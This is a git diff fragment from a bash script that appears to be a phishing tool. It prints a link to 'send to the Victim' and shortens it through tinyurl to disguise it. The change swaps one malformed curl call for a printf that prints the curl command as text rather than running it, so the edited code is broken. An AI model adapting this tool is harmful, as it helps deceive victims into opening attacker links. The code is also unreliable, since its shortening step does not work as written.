@@ -426,8 +426,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e
 
 #short_url=$(curl -s -N http://tinyurl.com/api-create.php?url=.$link | grep -o "http://tinyurl.com/[0-9a-z]*")
 
-command -s curl http://tinyurl.com/api-create.php?url=$link
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_url
+printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" curl -s http://tinyurl.com/api-create.php?url=$link #$short_url
 echo ""
 
 checkfound
